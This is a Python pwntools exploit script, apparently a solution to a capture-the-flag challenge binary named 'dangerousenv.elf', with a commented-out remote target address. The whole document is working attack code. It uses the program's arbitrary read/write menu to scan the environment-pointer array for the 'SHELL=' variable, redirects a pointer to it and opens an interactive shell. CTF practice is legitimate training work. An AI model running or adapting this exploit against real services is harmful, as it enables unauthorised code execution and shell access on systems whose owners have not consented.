from pwn import *
import re
target = process("./dangerousenv.elf")
# target = remote("10.214.160.13", 12702)

def get_value(target):
    target.sendline(b'1')
    time.sleep(0.2)
    content = target.recv().decode()
    # print("current content:{")
    # print(content)
    # print("}")
    regex = r"(?<=dword\s\[\[pos\]\]\s=\s)([0-9a-f]+?)h"
    data = re.search(regex, content).group(0)[:-1]
    return int(data, 16)

def set_value(target, value):
    target.sendline(b'0')
    target.sendline('{:x}'.format(value).encode())
    time.sleep(0.2)
    target.recv()


def try_exec(target):
    env_str_p = get_value(target)
    set_value(target, env_str_p)
    env_value = get_value(target)
    if env_value == 0x4c454853: # LEHS for SHELL=
        print("Found!")
        set_value(target, env_str_p+6)
        print('{:x}'.format(get_value(target)))
        # target.sendline(b'2')
        target.interactive()
    # if not response.startswith("Here we go"):
    #     target.interactive()


if __name__ == "__main__":
    log.setLevel('DEBUG')
    gdb.attach(target)
    info = target.recvline().decode()
    initial_pos_str = info.split('=')[1][:-2]
    print(initial_pos_str)
    initial_pos = int(initial_pos_str, 16)
    env_pos = initial_pos - 0x8
    print('{:x}'.format(env_pos))
    set_value(target, env_pos)
    envp_base = get_value(target)
    print('{:x}'.format(envp_base))
    for i in range(100):
        print("offset:", i)
        p = envp_base + 0x4*i
        set_value(target, p)
        try_exec(target)

